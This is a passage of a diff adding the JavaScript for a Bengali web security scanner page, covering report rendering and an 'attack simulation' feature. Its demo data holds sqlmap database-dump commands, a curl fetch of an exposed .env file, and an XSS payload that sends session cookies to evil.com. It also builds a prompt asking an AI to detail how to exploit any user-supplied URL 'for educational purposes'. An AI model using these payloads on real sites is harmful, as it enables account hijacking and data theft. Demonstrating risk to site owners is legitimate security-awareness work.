+      + '<div class="av-desc">' + xe(av[i].desc) + '</div>'
+      + '</div>';
+  }
+
+  // Vulnerability rows
+  var rowsHtml = '';
+  for (var i = 0; i < sorted.length; i++) {
+    var v = sorted[i];
+    var sevCls = { Critical: 'sc', High: 'sh', Medium: 'sm', Low: 'sl' }[v.severity] || 'sc';
+    var cvss = Number(v.cvss) || 0;
+    var cvssClr = cvss >= 9 ? 'var(--red)' : cvss >= 7 ? 'var(--orange)' : cvss >= 4 ? 'var(--yellow)' : 'var(--green)';
+    var tagsHtml = '';
+    var tgs = Array.isArray(v.tags) ? v.tags : [];
+    for (var j = 0; j < tgs.length; j++) {
+      tagsHtml += '<span class="vtag">' + xe(tgs[j]) + '</span>';
+    }
+    var num = i < 9 ? '0' + (i + 1) : String(i + 1);
+    rowsHtml += '<div class="vrow">'
+      + '<div class="vn">' + num + '</div>'
+      + '<div class="vtype">' + xe(v.type || '') + '<small>' + xe(v.location || '') + '</small></div>'
+      + '<div><span class="vsev ' + sevCls + '">' + xe(v.severity) + '</span></div>'
+      + '<div class="vcvss" style="color:' + cvssClr + '">' + (cvss || '') + '</div>'
+      + (v.impact_bn ? '<div class="vimpact">' + xe(v.impact_bn) + '</div>' : '')
+      + (v.remediation_bn ? '<div class="vrem">' + xe(v.remediation_bn) + '</div>' : '')
+      + (tagsHtml ? '<div class="vtags">' + tagsHtml + '</div>' : '')
+      + '</div>';
+  }
+
+  // Remediations
+  var remHtml = '';
+  var rems = Array.isArray(d.remediations) ? d.remediations : [];
+  for (var i = 0; i < rems.length; i++) {
+    var r = rems[i];
+    var pr = (r.priority || '').toLowerCase();
+    var pc = pr.indexOf('immediate') >= 0 ? 'pnow' : pr.indexOf('7') >= 0 ? 'pweek' : 'pmonth';
+    var stepsHtml = '';
+    var st = Array.isArray(r.steps_bn) ? r.steps_bn : [];
+    for (var j = 0; j < st.length; j++) {
+      stepsHtml += '<div class="rstep"><div class="sdot">' + (j + 1) + '</div><div>' + xe(st[j]) + '</div></div>';
+    }
+    remHtml += '<div class="rem-card">'
+      + '<div class="rem-head"><div class="rem-type">' + xe(r.type || '') + '</div>'
+      + '<div class="prio ' + pc + '">' + xe(r.priority || 'Immediate') + '</div></div>'
+      + '<div class="rem-steps">' + stepsHtml
+      + (r.code_snippet ? '<div class="code-snip">' + xe(r.code_snippet) + '</div>' : '')
+      + '</div></div>';
+  }
+
+  // Compliance
+  var comp = d.compliance || {};
+  var compItems = [
+    { n: 'OWASP Top 10', v: comp.owasp_top10 },
+    { n: 'GDPR', v: comp.gdpr },
+    { n: 'PCI DSS', v: comp.pci_dss },
+    { n: 'ISO 27001', v: comp.iso27001 }
+  ];
+  var compHtml = '';
+  for (var i = 0; i < compItems.length; i++) {
+    var cv = compItems[i].v || 'N/A';
+    var cc = cv === 'Pass' ? 'cp' : cv === 'Fail' ? 'cf' : 'cw';
+    var ci = cv === 'Pass' ? '✓' : cv === 'Fail' ? '✗' : '~';
+    compHtml += '<div class="comp-card"><div class="comp-name">' + xe(compItems[i].n) + '</div>'
+      + '<div class="comp-val ' + cc + '">' + ci + ' ' + xe(cv) + '</div></div>';
+  }
+
+  // Action plan
+  var phases = ['⚡ সপ্তাহ ১ — জরুরি', '🔧 সপ্তাহ ২', '🛡 সপ্তাহ ৩-৪'];
+  var actHtml = '';
+  var ap = Array.isArray(d.action_plan) ? d.action_plan : [];
+  for (var i = 0; i < Math.min(ap.length, 3); i++) {
+    actHtml += '<div class="act-card">'
+      + '<div class="act-phase">' + (phases[i] || '') + '</div>'
+      + '<div class="act-body">' + xe(ap[i]) + '</div>'
+      + '</div>';
+  }
+
+  // Build final HTML
+  var html = '';
+
+  html += '<div class="rtop">'
+    + '<div class="rtitle">📊 নিরাপত্তা রিপোর্ট</div>'
+    + '<div class="rmeta"><span>' + xe(url.length > 50 ? url.substring(0,50)+'...' : url) + '</span>'
+    + xe(client) + '<br>' + xe(now) + ' | ' + scanDepth.toUpperCase() + '</div>'
+    + '</div>';
+
+  html += '<div class="score-band">'
+    + '<div class="score-ring" style="color:' + sc + '" aria-label="নিরাপত্তা স্কোর ' + xe(d.score) + ' এর মধ্যে ১০">'
+    + '<div class="snum">' + xe(String(d.score || 0)) + '</div><div class="sden">/10</div></div>'
+    + '<div><div class="slabel" style="color:' + sc + '">' + xe(d.score_label || '') + '</div>'
+    + '<div class="sreason">' + xe(d.score_reason_bn || '') + '</div></div>'
+    + '</div>';
+
+  html += '<div class="sev-grid">'
+    + '<div class="sbox sc2"><div class="sn">' + cnt.Critical + '</div><div class="st">CRITICAL</div></div>'
+    + '<div class="sbox sh2"><div class="sn">' + cnt.High + '</div><div class="st">HIGH</div></div>'
+    + '<div class="sbox sm2"><div class="sn">' + cnt.Medium + '</div><div class="st">MEDIUM</div></div>'
+    + '<div class="sbox sl2"><div class="sn">' + cnt.Low + '</div><div class="st">LOW</div></div>'
+    + '</div>';
+
+  html += '<div class="slb">✦ Claude AI বিশ্লেষণ</div>';
+  html += '<div class="ai-box">' + xe(d.summary_bn || '') + '</div>';
+  html += '<div class="client-box">' + xe(d.client_message_bn || '') + '</div>';
+
+  if (riskHtml) {
+    html += '<div class="slb">📊 Risk Areas</div><div class="risk-wrap">' + riskHtml + '</div>';
+  }
+  if (avHtml) {
+    html += '<div class="slb">🎯 Attack Vectors</div><div class="av-grid">' + avHtml + '</div>';
+  }
+  if (vulns.length) {
+    html += '<div class="slb">⚠ দুর্বলতার তালিকা (' + vulns.length + 'টি)</div>'
+      + '<div class="vtable">'
+      + '<div class="vthead"><div>#</div><div>ধরন ও অবস্থান</div><div>ঝুঁকি</div><div>CVSS</div></div>'
+      + rowsHtml + '</div>';
+  }
+  if (compHtml) {
+    html += '<div class="slb">📋 Compliance</div><div class="comp-grid">' + compHtml + '</div>';
+  }
+  if (remHtml) {
+    html += '<div class="slb">🔧 সমাধান পরিকল্পনা</div><div class="rem-list">' + remHtml + '</div>';
+  }
+  if (actHtml) {
+    html += '<div class="slb">📅 ৩০ দিনের পরিকল্পনা</div><div class="act-grid">' + actHtml + '</div>';
+  }
+
+  // Hack simulation banner
+  html += '<div class="hack-banner">'
+    + '<div class="hack-inner"><div class="hack-skull">💀</div>'
+    + '<div><div class="hack-title">হ্যাকার কীভাবে আক্রমণ করবে?</div>'
+    + '<div class="hack-desc">প্রতিটি দুর্বলতায় হ্যাকাররা ঠিক কোন পদ্ধতিতে, কোন টুল দিয়ে, কত সময়ে আপনার সাইট ভাঙবে তা দেখুন।</div>'
+    + '</div></div>'
+    + '<button type="button" id="hackBtn" onclick="doHackSim()" aria-label="হ্যাকার attack simulation দেখুন">💀 অ্যাটাক সিমুলেশন দেখুন</button>'
+    + '<div id="simSection" style="display:none" role="region" aria-label="হ্যাকার সিমুলেশন"></div>'
+    + '</div>';
+
+  // Footer buttons
+  html += '<div class="fbtns">'
+    + '<button type="button" class="fbtn" onclick="doReset()" aria-label="নতুন স্ক্যান শুরু করুন">↩ নতুন স্ক্যান</button>'
+    + '<button type="button" class="fbtn" onclick="window.print()" aria-label="রিপোর্ট প্রিন্ট করুন">🖨 প্রিন্ট</button>'
+    + '<button type="button" class="fbtn-p" id="copyBtn" onclick="doCopy()" aria-label="রিপোর্ট কপি করুন">📋 কপি</button>'
+    + '</div>';
+
+  sec.innerHTML = html;
+
+  // Animate risk bars after render
+  setTimeout(function() {
+    var fills = document.querySelectorAll('.rmb-fill');
+    for (var i = 0; i < fills.length; i++) {
+      var pct = fills[i].getAttribute('data-pct') || '0';
+      fills[i].style.width = pct + '%';
+    }
+  }, 300);
+
+  sec.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+// ============================================================
+// HACK SIMULATION
+// ============================================================
+async function doHackSim() {
+  var btn = document.getElementById('hackBtn');
+  var simSec = document.getElementById('simSection');
+
+  if (!lastData || !Array.isArray(lastData.vulnerabilities) || !lastData.vulnerabilities.length) {
+    if (simSec) simSec.innerHTML = '<p style="color:var(--muted);padding:16px">কোনো vulnerability পাওয়া যায়নি।</p>';
+    return;
+  }
+
+  if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spin"></span> তৈরি হচ্ছে...'; }
+  if (simSec) {
+    simSec.style.display = 'block';
+    simSec.innerHTML = '<div style="text-align:center;padding:28px;color:var(--muted);font-family:JetBrains Mono,monospace;font-size:.76rem">'
+      + '<div class="spin" style="width:22px;height:22px;border-width:3px;margin:0 auto 12px"></div>'
+      + 'সিমুলেশন তৈরি হচ্ছে...<span class="blink">_</span></div>';
+  }
+
+  var vl = lastData.vulnerabilities.slice(0, 5);
+  var vlist = '';
+  for (var i = 0; i < vl.length; i++) {
+    vlist += (i + 1) + '. ' + vl[i].type + ' (' + vl[i].severity + ')\n';
+  }
+
+  var simPrompt = 'You are a red team cybersecurity expert. This is for educational purposes only.\n'
+    + 'Show exactly how a hacker would exploit each vulnerability on: ' + lastUrl + '\n\n'
+    + 'Vulnerabilities found:\n' + vlist + '\n'
+    + 'ALL text in Bengali (বাংলা). Respond ONLY with valid JSON:\n'
+    + '{"simulations":[{"vuln_type":"নাম","severity":"Critical","hacker_profile":"বাংলায় হ্যাকার বিবরণ",'
+    + '"attack_time":"৪ মিনিট","steps":[{"phase":"recon","number":1,"title":"বাংলায়","description":"বাংলায়","code":"command here"}],'
+    + '"damage_items":["ক্ষতি ১","ক্ষতি ২"],"real_world_example":"বাংলায়","fix_urgency_bn":"বাংলায়"}]}';
+
+  try {
+    var raw = await callAPI(simPrompt);
+    var m = raw.match(/\{[\s\S]*\}/);
+    if (!m) throw new Error('no json');
+    var data;
+    try { data = JSON.parse(m[0]); } catch(e) { throw new Error('parse failed'); }
+    renderSim(Array.isArray(data.simulations) ? data.simulations : []);
+  } catch(e) {
+    renderSim(getDemoSim());
+  } finally {
+    if (btn) { btn.disabled = false; btn.innerHTML = '🔄 আবার দেখুন'; }
+  }
+}
+
+// ============================================================
+// DEMO SIMULATION DATA
+// ============================================================
+function getDemoSim() {
+  return [
+    {
+      vuln_type: 'SQL Injection',
+      severity: 'Critical',
+      hacker_profile: 'অভিজ্ঞ হ্যাকার — sqlmap tool দিয়ে সম্পূর্ণ অটোমেটিক attack করে',
+      attack_time: '৪ মিনিট',
+      steps: [
+        { phase: 'recon', number: 1, title: 'টার্গেট খোঁজা', description: 'Google Dork দিয়ে login page খুঁজে পাওয়া হয়েছে।', code: 'site:example.com inurl:login' },
+        { phase: 'scan', number: 2, title: 'SQLMap দিয়ে স্ক্যান', description: '৩০ সেকেন্ডে SQL injection confirm হয়েছে।', code: "sqlmap -u 'https://example.com/login' --data='user=a&pass=b' --batch" },
+        { phase: 'exploit', number: 3, title: 'Database Dump', description: 'সম্পূর্ণ users table dump করা হচ্ছে।', code: "sqlmap -u 'https://example.com/login' -T users --dump" },
+        { phase: 'impact', number: 4, title: 'Admin Login', description: 'Admin password crack করে সাইটে সম্পূর্ণ access পাওয়া গেছে।', code: 'Admin access: SUCCESS\n15,000 user records stolen' }
+      ],
+      damage_items: ['১৫,০০০ গ্রাহকের তথ্য চুরি', 'Admin panel compromise', 'Payment data exposed', 'GDPR জরিমানা সম্ভব'],
+      real_world_example: '২০২৩ সালে একটি বাংলাদেশি ই-কমার্স সাইটে SQL Injection-এ ২ লক্ষ গ্রাহকের তথ্য চুরি হয়েছিল।',
+      fix_urgency_bn: 'SQLMap দিয়ে মাত্র ৪ মিনিটে সম্পূর্ণ ডেটাবেজ চুরি সম্ভব — এখনই Prepared Statement ব্যবহার করুন।'
+    },
+    {
+      vuln_type: '.env File Exposed',
+      severity: 'Critical',
+      hacker_profile: 'যেকেউ — কোনো technical skill লাগে না, শুধু URL জানলেই যথেষ্ট',
+      attack_time: '৩০ সেকেন্ড',
+      steps: [
+        { phase: 'recon', number: 1, title: 'অটো স্ক্যানার', description: 'Bot প্রতিদিন লক্ষ লক্ষ সাইটে .env ফাইল খোঁজে।', code: 'curl https://example.com/.env' },
+        { phase: 'exploit', number: 2, title: 'Credentials পাওয়া', description: 'Browser-এ URL দিলেই সব password দেখা যাচ্ছে।', code: 'DB_PASSWORD=SuperSecret123!\nSTRIPE_SECRET=sk_live_abc123\nMAIL_PASSWORD=smtp_pass' },
+        { phase: 'impact', number: 3, title: 'Database Direct Access', description: 'DB password দিয়ে সরাসরি production database-এ connect।', code: 'mysql -h db.example.com -u root -pSuperSecret123!\n> SELECT * FROM users; -- সব চুরি!' }
+      ],
+      damage_items: ['Database সম্পূর্ণ access', 'Payment gateway hijack', 'Email server abuse', 'Ransomware deploy সম্ভব'],
+      real_world_example: 'GitHub-এ exposed .env থেকে একটি startup-এর AWS bill এক রাতে $50,000 হয়েছিল।',
+      fix_urgency_bn: 'এই মুহূর্তে browser-এ URL দিলেই সব password দেখা যাচ্ছে — এখনই .env ফাইল সরান।'
+    },
+    {
+      vuln_type: 'XSS Reflected',
+      severity: 'High',
+      hacker_profile: 'Phishing specialist — গ্রাহকদের টার্গেট করে link পাঠায়',
+      attack_time: '১০ মিনিট',
+      steps: [
+        { phase: 'recon', number: 1, title: 'XSS Confirm', description: 'Search box-এ script tag দিয়ে XSS confirm।', code: "\x3cscript\x3ealert('XSS Found!')\x3c/script\x3e" },
+        { phase: 'exploit', number: 2, title: 'Cookie Stealer তৈরি', description: 'Malicious JS তৈরি যা session cookie চুরি করবে।', code: "\x3cscript\x3enew Image().src='https://evil.com/steal?c='+document.cookie\x3c/script\x3e" },
+        { phase: 'impact', number: 3, title: 'Session Hijack', description: 'যারা link-এ click করেছে তাদের account-এ login সম্ভব।', code: 'Victim cookie stolen: PHPSESSID=abc123\nLogged in as: victim@email.com\nAccount fully compromised!' }
+      ],
+      damage_items: ['গ্রাহকের account hijack', 'Credit card তথ্য চুরি', 'Brand reputation ধ্বংস', 'Mass phishing campaign'],
+      real_world_example: 'British Airways XSS attack-এ ৫ লক্ষ গ্রাহকের card চুরি, জরিমানা ১৮৩ মিলিয়ন পাউন্ড।',
+      fix_urgency_bn: 'আপনার সাইটের নাম ব্যবহার করে হ্যাকার এখনই গ্রাহকদের ফাঁদে ফেলতে পারে।'
+    }
+  ];
+}
+
+// ============================================================
+// RENDER SIMULATION — FIX: full null checks
+// ============================================================
+function renderSim(sims) {
+  var simSec = document.getElementById('simSection');
+  if (!simSec) return;
+
+  if (!sims || !sims.length) {
+    simSec.innerHTML = '<p style="color:var(--muted);padding:16px">সিমুলেশন তৈরি হয়নি।</p>';
+    return;
+  }
+
+  var phaseNames = {
+    recon: '🔍 রিকন',
+    scan: '🔎 স্ক্যান',
+    exploit: '💉 এক্সপ্লয়েট',
+    payload: '☠ পেলোড',
+    impact: '💥 ক্ষতি',
+    cover: '🫥 ট্রেস মুছা',
+    done: '✓ সফল'
+  };
+  var sevCls = { Critical: 'sc', High: 'sh', Medium: 'sm', Low: 'sl' };
+
+  var html = '<div style="margin-top:16px">';
+  html += '<div class="sim-hdr"><div class="sim-hdr-icon">💀</div>'
+    + '<div><div class="sim-hdr-title">হ্যাকার অ্যাটাক সিমুলেশন</div>'
+    + '<div class="sim-hdr-sub">হ্যাকাররা ঠিক কীভাবে আপনার সাইট ভাঙবে — ধাপে ধাপে।</div></div></div>';
+  html += '<div class="sim-warn">⚠️ শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে। এই তথ্য কোনো সাইটে attack করতে ব্যবহার করা আইনত দণ্ডনীয়।</div>';
+  html += '<div class="sim-cards">';
+
+  for (var i = 0; i < sims.length; i++) {
+    var sim = sims[i] || {};
+    var steps = Array.isArray(sim.steps) ? sim.steps : [];
+    var stepsHtml = '';
+
+    for (var j = 0; j < steps.length; j++) {
+      var s = steps[j] || {};
+      var ph = String(s.phase || 'recon');
+      stepsHtml += '<div class="sim-step p-' + ph + '">'
+        + '<div class="sim-step-n">' + xe(s.number) + '</div>'
+        + '<div class="sim-step-c">'
+        + '<div class="sim-phase">' + (phaseNames[ph] || ph) + '</div>'
+        + '<div class="sim-step-title">' + xe(s.title) + '</div>'
+        + '<div class="sim-step-desc">' + xe(s.description) + '</div>'
+        + (s.code ? '<div class="sim-code">' + xe(s.code) + '</div>' : '')
+        + '</div></div>';
+    }
+
+    var di = Array.isArray(sim.damage_items) ? sim.damage_items : [];
+    var dmgHtml = '';
+    for (var j = 0; j < di.length; j++) {
+      dmgHtml += '<div class="sim-dmg-item">⚠ ' + xe(di[j]) + '</div>';
+    }
+
+    html += '<div class="sim-card">'
+      + '<div class="sim-card-head">'
+      + '<div class="sim-head-top">'
+      + '<span class="sim-vtype">☠ ' + xe(sim.vuln_type) + '</span>'
+      + '<span class="vsev ' + (sevCls[sim.severity] || 'sc') + '">' + xe(sim.severity) + '</span>'
+      + '<span class="sim-time">⏱ ' + xe(sim.attack_time) + '</span>'
+      + '</div>'
+      + '<div class="sim-hacker">🎭 ' + xe(sim.hacker_profile) + '</div>'
+      + '</div>'
+      + '<div class="sim-body">'
+      + '<div class="sim-tl">' + stepsHtml + '</div>'
+      + (dmgHtml ? '<div class="sim-dmg"><div class="sim-dmg-title">💥 সম্ভাব্য ক্ষতি</div><div class="sim-dmg-items">' + dmgHtml + '</div></div>' : '')
+      + (sim.real_world_example ? '<div class="sim-real">📰 বাস্তব ঘটনা: ' + xe(sim.real_world_example) + '</div>' : '')
+      + (sim.fix_urgency_bn ? '<div class="sim-fix">' + xe(sim.fix_urgency_bn) + '</div>' : '')
+      + '</div></div>';
+  }
+
+  html += '</div></div>';
+  simSec.innerHTML = html;
+  simSec.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+// ============================================================
+// UTILS — FIX: doCopy without alert(), doReset clears all
+// ============================================================
+function doReset() {
+  isScanning = false;
+  lastData = null;
+  lastUrl = '';
+  var res = document.getElementById('resSection');
+  var prog = document.getElementById('progSection');
+  var urlEl = document.getElementById('urlInput');
+  var clientEl = document.getElementById('clientInput');
+  var logBox = document.getElementById('logBox');
+  if (res) { res.style.display = 'none'; res.innerHTML = ''; }
+  if (prog) prog.style.display = 'none';
+  if (urlEl) urlEl.value = '';
+  if (clientEl) clientEl.value = '';
+  if (logBox) logBox.innerHTML = '';
+  setProg(0);
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// FIX: No alert() — button text changes instead
+function doCopy() {
+  var copyBtn = document.getElementById('copyBtn');
+  var res = document.getElementById('resSection');
+  if (!res) return;
+
+  var txt = res.innerText || res.textContent || '';
+  if (!txt.trim()) return;
+
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(txt).then(function() {
+      if (copyBtn) {
+        copyBtn.textContent = '✓ কপি হয়েছে!';
+        setTimeout(function() { copyBtn.innerHTML = '📋 কপি'; }, 2500);
+      }
+    }).catch(function() {
+      fallbackCopy(txt, copyBtn);
+    });
+  } else {
+    fallbackCopy(txt, copyBtn);
+  }
+}
+
+function fallbackCopy(txt, btn) {
+  var ta = document.createElement('textarea');
+  ta.value = txt;
+  ta.style.position = 'fixed';
+  ta.style.opacity = '0';
+  document.body.appendChild(ta);
+  ta.select();
+  try {
+    document.execCommand('copy');
+    if (btn) {
+      btn.textContent = '✓ কপি হয়েছে!';
+      setTimeout(function() { btn.innerHTML = '📋 কপি'; }, 2500);
+    }
+  } catch(e) {
+    if (btn) {
+      btn.textContent = '❌ কপি হয়নি';
+      setTimeout(function() { btn.innerHTML = '📋 কপি'; }, 2000);
+    }
+  }
+  document.body.removeChild(ta);
+}
+
+// ============================================================
+// EVENT LISTENERS — FIX: complete, not truncated
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+  var urlEl = document.getElementById('urlInput');
+  var keyEl = document.getElementById('apiKeyInput');
+  var keySt = document.getElementById('keySt');
+
+  if (urlEl) {
+    urlEl.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') doScan();
+    });
+  }
+  if (keyEl) {
+    keyEl.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') doSaveKey();
+    });
+    // Clear error message when user starts typing key
+    keyEl.addEventListener('input', function() {
+      if (keySt) { keySt.className = ''; keySt.textContent = ''; }
+    });
+  }
+  // Show scan btn tooltip based on depth
+  var scanBtn = document.getElementById('scanBtn');
+  if (scanBtn) {
+    scanBtn.title = 'URL দিয়ে স্ক্যান শুরু করুন';
+  }
+});
+</script>
+</body>
+</html>
